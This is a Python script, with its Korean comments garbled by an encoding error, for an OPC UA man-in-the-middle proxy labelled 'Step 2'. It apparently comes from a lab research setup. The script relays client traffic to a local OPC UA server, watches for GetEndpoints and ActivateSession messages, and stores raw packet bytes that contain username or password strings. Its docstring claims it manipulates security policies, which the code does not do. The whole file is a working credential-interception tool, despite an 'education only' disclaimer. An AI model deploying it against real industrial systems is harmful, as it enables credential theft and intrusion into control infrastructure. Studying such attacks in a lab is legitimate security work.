#!/usr/bin/env python3
"""
Step 2: OPC UA MITM í”„ë¡ì‹œ
GetEndpoints ì‘ë‹µì„ ê°€ë¡œì±„ì„œ ë³´ì•ˆ ì •ì±…ì„ ì¡°ì‘í•©ë‹ˆë‹¤.
"""
import sys
sys.path.insert(0, '/root/opcua-research/python-opcua-env/lib/python3.10/site-packages')

import socket
import threading
import struct
from opcua import ua

class OPCUAProxy:
    """OPC UA MITM í”„ë¡ì‹œ"""
    
    def __init__(self, listen_port, target_host, target_port):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.captured_passwords = []
        
    def start(self):
        """í”„ë¡ì‹œ ì„œë²„ ì‹œì‘"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.listen_port))
        server_socket.listen(5)
        
        print(f"ğŸ”§ MITM í”„ë¡ì‹œ ì‹œì‘")
        print(f"   ë¦¬ìŠ¤ë‹: 0.0.0.0:{self.listen_port}")
        print(f"   íƒ€ê²Ÿ: {self.target_host}:{self.target_port}")
        print()
        
        try:
            while True:
                client_socket, addr = server_socket.accept()
                print(f"ğŸ“¡ í´ë¼ì´ì–¸íŠ¸ ì—°ê²°: {addr}")
                
                # ìƒˆ ìŠ¤ë ˆë“œì—ì„œ ì²˜ë¦¬
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket,)
                )
                thread.daemon = True
                thread.start()
                
        except KeyboardInterrupt:
            print("\nğŸ›‘ í”„ë¡ì‹œ ì¢…ë£Œ")
        finally:
            server_socket.close()
    
    def handle_client(self, client_socket):
        """í´ë¼ì´ì–¸íŠ¸ ìš”ì²­ ì²˜ë¦¬"""
        try:
            # íƒ€ê²Ÿ ì„œë²„ì— ì—°ê²°
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_host, self.target_port))
            
            print(f"   âœ… íƒ€ê²Ÿ ì„œë²„ ì—°ê²° ì„±ê³µ")
            
            # ì–‘ë°©í–¥ ë°ì´í„° ì „ë‹¬ (íŒ¨í‚· ë¶„ì„ í¬í•¨)
            self.relay_data(client_socket, server_socket)
            
        except Exception as e:
            print(f"   âŒ ì˜¤ë¥˜: {e}")
        finally:
            client_socket.close()
            try:
                server_socket.close()
            except:
                pass
    
    def relay_data(self, client_socket, server_socket):
        """ë°ì´í„° ì¤‘ê³„ ë° ë¶„ì„"""
        
        def forward(source, destination, direction):
            """ë°ì´í„° ì „ë‹¬ ë° ë¶„ì„"""
            try:
                while True:
                    data = source.recv(4096)
                    if not data:
                        break
                    
                    # íŒ¨í‚· ë¶„ì„
                    self.analyze_packet(data, direction)
                    
                    # ë°ì´í„° ì „ë‹¬
                    destination.sendall(data)
            except:
                pass
        
        # ì–‘ë°©í–¥ ìŠ¤ë ˆë“œ ìƒì„±
        c2s = threading.Thread(target=forward, args=(client_socket, server_socket, "Câ†’S"))
        s2c = threading.Thread(target=forward, args=(server_socket, client_socket, "Sâ†’C"))
        
        c2s.daemon = True
        s2c.daemon = True
        
        c2s.start()
        s2c.start()
        
        c2s.join()
        s2c.join()
    
    def analyze_packet(self, data, direction):
        """íŒ¨í‚· ë‚´ìš© ë¶„ì„"""
        if len(data) < 8:
            return
        
        try:
            # OPC UA ë©”ì‹œì§€ í—¤ë” í™•ì¸
            msg_type = data[:3]
            
            if msg_type == b'MSG':
                # GetEndpoints ê´€ë ¨
                if b'GetEndpoints' in data:
                    print(f"   ğŸ” {direction} GetEndpoints ë©”ì‹œì§€ ê°ì§€")
                
                # ActivateSession ê´€ë ¨
                if b'ActivateSession' in data:
                    print(f"   ğŸ”‘ {direction} ActivateSession ë©”ì‹œì§€ ê°ì§€")
                    if direction == "Câ†’S":
                        print(f"      âš ï¸  íŒ¨ìŠ¤ì›Œë“œ ì „ì†¡ ê°€ëŠ¥ì„±!")
                        # íŒ¨ìŠ¤ì›Œë“œ ì¶”ì¶œ ì‹œë„
                        self.extract_password(data)
                
        except:
            pass
    
    def extract_password(self, data):
        """ActivateSessionì—ì„œ íŒ¨ìŠ¤ì›Œë“œ ì¶”ì¶œ"""
        try:
            # ê°„ë‹¨í•œ ë¬¸ìì—´ ê²€ìƒ‰
            data_str = data.decode('utf-8', errors='ignore')
            
            # Username/Password íŒ¨í„´ ì°¾ê¸°
            if 'username' in data_str.lower() or 'password' in data_str.lower():
                print(f"      ğŸ¯ ì¸ì¦ ì •ë³´ ê°ì§€!")
                
                # ì¶”ì¶œëœ ë°ì´í„° ì €ì¥
                self.captured_passwords.append({
                    'timestamp': __import__('time').time(),
                    'data': data[:200]  # ì²˜ìŒ 200ë°”ì´íŠ¸ë§Œ
                })
        except:
            pass

def main():
    print("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
    print("â•‘        Step 2: OPC UA MITM í”„ë¡ì‹œ                             â•‘")
    print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    print()
    print("âš ï¸  ì´ ë„êµ¬ëŠ” êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©í•˜ì„¸ìš”!")
    print()
    
    # ì˜ˆì œ: Python opcua ì„œë²„ (4841)ì— ëŒ€í•œ í”„ë¡ì‹œ
    # í”„ë¡ì‹œ í¬íŠ¸: 14841 (10000 + 4841)
    proxy = OPCUAProxy(
        listen_port=14841,
        target_host='localhost',
        target_port=4841
    )
    
    print("ğŸ’¡ ì‚¬ìš© ë°©ë²•:")
    print("   1. ì´ í”„ë¡ì‹œë¥¼ ì‹¤í–‰")
    print("   2. í´ë¼ì´ì–¸íŠ¸ë¥¼ localhost:14841ë¡œ ì—°ê²°")
    print("   3. í”„ë¡ì‹œê°€ localhost:4841ë¡œ ì¤‘ê³„")
    print("   4. ì¤‘ê°„ì— íŒ¨í‚· ë¶„ì„ ë° ì¡°ì‘")
    print()
    
    try:
        proxy.start()
    except Exception as e:
        print(f"âŒ ì˜¤ë¥˜: {e}")

if __name__ == "__main__":
    main()
